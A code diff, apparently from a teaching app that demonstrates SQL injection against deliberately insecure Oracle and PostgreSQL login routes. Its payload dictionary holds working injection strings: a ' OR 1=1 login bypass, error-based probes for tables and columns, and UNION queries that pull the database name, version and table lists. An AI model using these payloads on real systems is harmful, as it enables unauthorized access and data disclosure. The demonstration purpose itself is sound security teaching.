@@ -11,25 +11,34 @@ sql_injections = {
         """,
         "credenciales":[
             {
+                # Login sin credenciales válidas
                 "nombre":"Unauthorized login",
-                "usuario:":"cualquier_input",
-                "password:":"cualquier_input' OR 1=1; --"
+                "usuario":"cualquier_input",
+                "password":"cualquier_input' OR 1=1 --"
             },
             {
+                # Obtener informacion sobre la existencia de tablas en la BD
                 "nombre":"DB tables info",
-                "usuario:":"' OR 1=(SELECT * FROM tabla_inexistente) --",
-                "password:":"cualquier_input"
+                "usuario":"' OR 1=(SELECT * FROM tabla_inexistente) --",
+                "password":"cualquier_input"
             },
             {
+                # Obtener informacion sobre columnas en una tabla existente
                 "nombre":"DB table column info",
-                "usuario:":"' OR 1=(SELECT columna_inexistente FROM usuarios) --",
-                "password:":"cualquier_input"
+                "usuario":"' OR 1=(SELECT columna_inexistente FROM Usuarios) --",
+                "password":"cualquier_input"
+            },
+            {
+                # Obtener informacion sobre el SGBD al probar si la funcion version() es valida en el SGBD en el que se esta trabajando (funciona en PostgreSQL y MySQL)
+                "nombre":"SGBD info",
+                "usuario":"' OR version() = 'PostgreSQL' --",
+                "password":"cualquier_input"
             }
         ],
         "route_oracle": "login_oracle_database_error",
         "route_postgres": "login_postgres_database_error",
-        "function_oracle": login_inseguro_errors_oracle,  # Debes implementar esto en `setupOracle`
-        "function_postgres": login_inseguro_errors_postgresql  # Debes implementar esto en `setupPostgreSQL`
+        "function_oracle": login_inseguro_errors_oracle,
+        "function_postgres": login_inseguro_errors_postgresql
     },
     "server_error": {
         "title": "Inyección SQL Basada en Errores del Servidor",
@@ -53,30 +62,43 @@ sql_injections = {
         "credenciales":[
             {
                 "nombre":"Unauthorized login",
-                "usuario:":"cualquier_input",
-                "password:":"cualquier_input' OR 1=1; --"
+                "usuario":"cualquier_input",
+                "password":"cualquier_input' OR 1=1 --"
             },
             {
                 "nombre":"DB name (Oracle)",
-                "usuario:":"cualquier_input",
-                "password:":"cualquier_input' OR 1=1 UNION SELECT ora_database_name AS nombre_bd FROM dual; --"
-                #SELECT banner, NULL FROM v$version WHERE ROWNUM = 1
+                "usuario":"cualquier_input",
+                "password":"cualquier_input' UNION SELECT 1, ora_database_name, NULL AS nombre_bd FROM dual --"
             },
             {
                 "nombre":"DB version (Oracle)",
-                "usuario:":"admin",
-                "password:":"test' OR 1=1 UNION SELECT * FROM v$version WHERE banner LIKE 'Oracle%'; --"
-                #SELECT banner, NULL FROM v$version WHERE ROWNUM = 1
+                "usuario":"cualquier_input",
+                "password":"cualquier_input' UNION SELECT NULL, banner, NULL FROM v$version WHERE banner LIKE 'Oracle%' --"
             },
             {
                 "nombre":"DB name (PostgreSQL)",
-                "usuario:":"admin",
-                "password:":"test' OR 1=1; --"
+                "usuario":"cualquier_input",
+                "password":"cualquier_input' UNION SELECT current_database() AS nombre_bd; --"
             },
             {
                 "nombre":"DB version (PostgreSQL)",
-                "usuario:":"admin",
-                "password:":"test' OR 1=1; --"
+                "usuario":"cualquier_input",
+                "password":"cualquier_input' UNION SELECT NULL, version(), NULL; --"
+            },
+            {
+                "nombre":"All tables in the DB (Oracle)",
+                "usuario":"cualquier_input",
+                "password":"cualquier_input' UNION SELECT 1, OWNER, TABLE_NAME FROM all_tables WHERE OWNER='SYSTEM' -- AND password = 'cualquier_input'"
+            },
+            {
+                "nombre":"All tables in the DB (PostgreSQL)",
+                "usuario":"cualquier_input",
+                "password":"cualquier_input' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema = 'public'; --"
+            },
+            {
+                "nombre":"All tables in the DB (Oracle - Filtrado)",
+                "usuario":"cualquier_input",
+                "password":"cualquier_input' UNION SELECT 1, OWNER, TABLE_NAME FROM all_tables WHERE owner = 'SYSTEM' AND TABLE_NAME NOT LIKE '%$%' AND TABLE_NAME NOT LIKE 'SYS%' AND TABLE_NAME NOT LIKE 'LOGMNR%' --"
             }
         ],
         "route_oracle": "login_oracle_union",
